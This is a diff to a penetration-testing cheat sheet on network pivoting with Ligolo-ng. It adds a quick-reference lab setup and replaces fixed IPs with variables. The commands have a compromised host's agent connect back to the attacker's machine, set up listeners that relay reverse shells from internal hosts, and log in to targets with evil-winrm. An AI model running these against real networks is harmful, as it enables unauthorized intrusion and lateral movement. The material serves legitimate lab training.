@@ -267,7 +267,71 @@ Chisel can also tunnel over HTTPS by placing it behind a reverse proxy, making t
 
 Modern tunneling framework that creates a full network tunnel (not just SOCKS). With Ligolo-ng, tools behave as if they're directly connected to the internal network — no Proxychains required.
 
-### Setup (Kali — Proxy)
+### Quick Reference — Lab Tunnel Setup
+
+Step-by-step for getting a tunnel up fast in a lab environment.
+
+**1. Start the proxy on Kali:**
+
+```bash
+sudo ligolo-proxy -selfcert
+```
+
+**2. Transfer the agent to the target and connect back:**
+
+Linux:
+
+```bash
+./agent -connect $LHOST:11601 -ignore-cert
+```
+
+Windows:
+
+```powershell
+.\agent.exe -connect $LHOST:11601 -ignore-cert
+```
+
+**3. Select your session and autoroute:**
+
+In the Ligolo proxy interface:
+
+```
+>> session
+>> [select session number]
+>> autoroute
+```
+
+Select the network you want to reach. Answer `yes` when prompted to create a new TUN interface.
+
+**4. Set up port forwarding (if needed):**
+
+Forward a port from the pivot host back to Kali — useful for catching reverse shells from internal machines:
+
+```
+>> listener_add --addr $TARGET:3456 --to $LHOST:3456
+```
+
+:::tip
+Run `help` in the Ligolo interface for a full command list. Run `help listener_add` for listener syntax details.
+:::
+
+:::warning
+If you accidentally kill your tunnel, you must delete the existing Ligolo TUN interface before re-establishing:
+
+```bash
+sudo ip link delete <ligolo_interface_name>
+```
+
+Then restart the proxy and reconnect the agent.
+:::
+
+---
+
+### Detailed Setup
+
+The sections below cover manual TUN interface creation, routing, double pivots, and other advanced usage.
+
+#### Setup (Kali — Proxy)
 
 Create a TUN interface:
 
@@ -282,7 +346,7 @@ Start the Ligolo proxy:
 ./proxy -selfcert -laddr 0.0.0.0:11601
 ```
 
-### Setup (Target — Agent)
+#### Setup (Target — Agent)
 
 Transfer the agent binary to the compromised host and connect back:
 
@@ -298,7 +362,7 @@ Windows:
 .\agent.exe -connect $LHOST:11601 -ignore-cert
 ```
 
-### Start the Tunnel
+#### Start the Tunnel
 
 In the Ligolo proxy interface, select the session and start the tunnel:
 
@@ -317,12 +381,12 @@ sudo ip route add 172.16.1.0/24 dev ligolo
 Now you can access the internal network directly from Kali — no Proxychains needed:
 
 ```bash
-nmap -sCV -p- 172.16.1.10
-evil-winrm -i 172.16.1.10 -u $USER -p $PASSWORD
-smbclient -L //172.16.1.10/ -U $USER
+nmap -sCV -p- $TARGET
+evil-winrm -i $TARGET -u $USER -p $PASSWORD
+smbclient -L //$TARGET/ -U $USER
 ```
 
-### Port Forwarding with Ligolo-ng
+#### Port Forwarding with Ligolo-ng
 
 Forward a port from the internal network to Kali:
 
@@ -334,7 +398,7 @@ In the Ligolo interface:
 
 This listens on the pivot host's port 4444 and forwards to Kali's port 4444 — useful for catching reverse shells from internal machines.
 
-### Double Pivot with Ligolo-ng
+#### Double Pivot with Ligolo-ng
 
 To reach a third network through a second pivot:
 
@@ -347,8 +411,6 @@ To reach a third network through a second pivot:
 :::tip
 Ligolo-ng is significantly faster and easier to use than Proxychains + SSH dynamic forwarding for most operations. The only downside is transferring the agent binary to the target.
 :::
-
----
 
 ## sshuttle
 
